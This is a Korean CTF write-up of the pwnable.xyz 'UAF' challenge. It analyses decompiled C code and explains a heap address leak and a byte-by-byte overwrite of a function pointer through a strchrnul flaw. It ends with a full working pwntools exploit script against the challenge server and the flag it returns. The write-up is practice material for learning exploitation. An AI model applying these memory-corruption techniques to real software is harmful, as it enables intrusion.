# [pwnable.xyz] UAF

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Is it time for a UAF challenge yet?
>
> Release: [UAF.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8975366/UAF.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/175515154-33aa19a5-d4a6-49f4-a57b-019013ab23c1.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### struct game & struct calcResult

![image](https://user-images.githubusercontent.com/104156058/175519021-338d0f91-e6a7-4d26-9a8c-844188e9e231.png)

`game` 구조체는 게임의 정보를 담고 있다. 이름 `0x80`바이트, 게임 결과를 담고 있는 구조체의 포인터 `calcResult`, 게임을 플레이할 때 실행되는 함수의 주소 `playFunc`로 구성된다.

![image](https://user-images.githubusercontent.com/104156058/175519160-73ecb88d-0842-4cf9-aeef-b329527a577f.png)

`calcResult` 구조체는 게임의 결과를 담고 있다. 게임을 한 번 플레이할 때마다 `result` 배열에 게임 결과가 하나씩 채워지게 된다.

### `initialize_game()`

```c
game *initialize_game()
{
  game *ptr; // rbx
  game *result; // rax

  cur = (game *)malloc(0x90uLL);
  ptr = cur;
  ptr->calcResult = (calcResult *)malloc(0x90uLL);
  cur->playFunc = calc;
  result = cur;
  saves[0] = cur;
  return result;
}
```

초기에 게임을 하나 만들어서 `cur`과 `saves[0]`에 포인터를 저장한다. `playFunc`에는 기본적으로 `calc()`의 주소가 들어간다.

### `main()`

```c
  setup();
  initialize_game();
  printf("Name: ");
  read(0, cur, 0x7FuLL);
```

`initialize_game()`으로 게임을 하나 만들고, `name`을 입력받는다.

#### 1. Play

```c
      case 1:
        ((void (*)(void))cur->playFunc)();
        break;
```

`cur->playFunc()`에 있는 함수를 호출한다. 기본적으로 `calc()`의 주소가 저장되어 있다.

#### calc()

```c
  for ( i = 0; i <= 0x23; ++i )
  {
    if ( !cur->calcResult->result[i] )
    {
      num1 = 0;
      num2 = 0;
      __isoc99_scanf("%d %d", &num1, &num2);
      cur->calcResult->result[i] = num1 ^ num2;
      return __readfsqword(0x28u) ^ v4;
    }
  }
  puts("No space.");
  return __readfsqword(0x28u) ^ v4;
```

`cur->calcResult`의 앞에서부터 빈 공간을 찾는다. 빈 공간을 찾으면 두 수를 입력받고 그 두 수를 xor한 결과를 저장하고 종료한다. 빈 공간을 찾지 못하면 `"no space."`를 출력하고 종료한다.

#### 2. Save game

```c
      case 2:
        save_game();
        break;
```

#### save_game()

```c
  for ( i = 1; ; ++i )
  {
    if ( i > 9 )
    {
      LODWORD(result) = puts("No space.");
      return result;
    }
    if ( !saves[i] )
      break;
  }
```

`saves`의 앞에서부터 빈 공간을 찾는다. `saves[9]`까지 최대 10개의 게임만 저장할 수 있다.

```c
  saves[i] = (game *)malloc(0x90uLL);
  savedGame = saves[i];
  savedGame->calcResult = (calcResult *)malloc(0x90uLL);
  if ( !saves[i]->playFunc )
    saves[i]->playFunc = cur->playFunc;
```

빈 공간을 찾으면 청크를 새로 할당해서 `saves[i]`에 그 주소를 저장한다. `calcResult`에도 새로운 청크를 할당한다. `playFunc`가 비어 있다면 `cur->playFunc`의 값을 그대로 넣는다.

```c
  read(0, saves[i], 0x80uLL);
```

`name`을 입력받는다. `main()`에서와 다르게, `0x80`바이트까지 입력할 수 있다.

#### 3. Delete save

```c
      case 3:
        delete_save();
        break;
```

#### delete_save()

```c
  printf("Save #: ");
  idx = read_int32();
  if ( idx >= 10 )
    puts("Invalid");
  savedGame = saves[idx];
```

삭제할 게임의 `idx`를 입력받는다. 최대 9까지만 가능하다.

```c
  if ( savedGame )
  {
    calcResult = saves[idx]->calcResult;
    free(saves[idx]);
    saves[idx]->calcResult = 0LL;
    free(calcResult);
    savedGame = (game *)saves;
    saves[idx] = 0LL;
  }
```

입력한 `idx`에 저장된 게임이 있으면 그 게임을 불러와서, `calcResult` 청크와 `savedGame` 청크를 모두 할당 해제하고, `saves[idx]`에 저장된 포인터도 0으로 초기화한다.

#### 4. Print name

```c
      case 4:
        printf("Save name: %s\n", cur->name);
        break;
```

`cur->name`을 `"%s"`로 출력한다.

#### 5. Change char

```c
      case 5:
        edit_char();
        break;
```

#### edit_char()

```c
  puts("Edit a character from your name.");
  printf("Char to replace: ");
  oldChar = getchar();
  getchar();
  printf("New char: ");
  newChar = getchar();
  result = getchar();
```

문자 하나를 선택해서 다른 문자로 바꿀 수 있다. 먼저 바꿀 `oldChar`와 새로 들어갈 `newChar`를 입력받는다.

```c
  if ( oldChar && newChar )
  {
    result = (unsigned int)strchrnul(cur->name, oldChar);
    if ( result )
      *(_BYTE *)(int)result = newChar;
    else
      return puts("Character not found.");
  }
```

`cur->name`의 앞에서부터 `oldChar`를 찾아서, 있으면 그 자리에 `newChar`를 넣는다.

## Exploit

`cur->playFunc`를 `win()`의 주소로 덮어쓰고 `1. Play`를 실행하면 플래그를 획득할 수 있다.

### Heap leak

`save_game()`에서 `name`에 `0x80`바이트를 입력하면, `name`과 `calcResult` 사이에 `0x00`이 없이 인접하게 된다. 이 상태에서 `4. Print name`을 실행하면 `calcResult`까지 함께 출력되어 heap의 주소를 계산할 수 있다.

```python
# heap leak

sa('Name: ', 'A')

save('A' * 0x80)
print_name()

r.recvuntil('A' * 0x80)
heap = u64(r.recvline()[:-1].ljust(8, b'\x00'))
```

### Overwrite `cur->playFunc`

`edit_char()`에서는 `cur->name`에 `oldChar`가 있는지 검사하기 위해 `strchrnul()` 함수를 사용하는데, 이 함수는 찾으려는 문자가 존재하지 않으면 문자열 끝의 NULL terminator의 주소를 반환한다. 따라서 문자열을 1바이트씩 연장할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/176110249-848f57a8-28ab-4b28-b7ac-4f79c0134c32.png)

Heap leak 이후 `cur` 청크의 상태는 위와 같다. `edit_char()`의 취약점을 이용하여 빨간 박스 부분에 `0x00`이 없도록 모두 채우면, `cur->playFunc`를 1바이트씩 수정하여 `win()`의 주소로 바꿀 수 있다.

```python
# overwrite cur->playFunc

for i in range(4):
    change_char(chr(0xff), chr(0x41))

if heap & 0xff000000 == 0:
    change_char(chr(0xff), chr(0x41))

change_char(chr(calc & 0xff), chr(win & 0xff))
change_char(chr((calc & 0xff00) >> 8), chr((win & 0xff00) >> 8))

sla('> ', '1') # call win()
```

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30015)

sla = r.sendlineafter
sa = r.sendafter

def play(num1, num2):
    sa('> ', '1')
    r.sendline(str(num1) + ' ' + str(num2))

def save(name):
    sa('> ', '2')
    sa('Save name: ', name)

def delete(idx):
    sa('> ', '3')
    sla('Save #: ', str(idx))

def print_name():
    sa('> ', '4')

def change_char(old, new):
    sa('> ', '5')
    sla('Char to replace: ', old)
    sla('New char: ', new)

calc = 0x400d6b
win = 0x400cf3
cur = 0x6022c0
saves = 0x6022e0


# heap leak

sa('Name: ', 'A')

save('A' * 0x80)
print_name()

r.recvuntil('A' * 0x80)
heap = u64(r.recvline()[:-1].ljust(8, b'\x00'))


# overwrite cur->playFunc

for i in range(4):
    change_char(chr(0xff), chr(0x41))

if heap & 0xff000000 == 0:
    change_char(chr(0xff), chr(0x41))

change_char(chr(calc & 0xff), chr(win & 0xff))
change_char(chr((calc & 0xff00) >> 8), chr((win & 0xff00) >> 8))

sla('> ', '1') # call win()


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30015: Done
[*] Switching to interactive mode
FLAG{sry_that_was_mean_no_UAF_here}
```
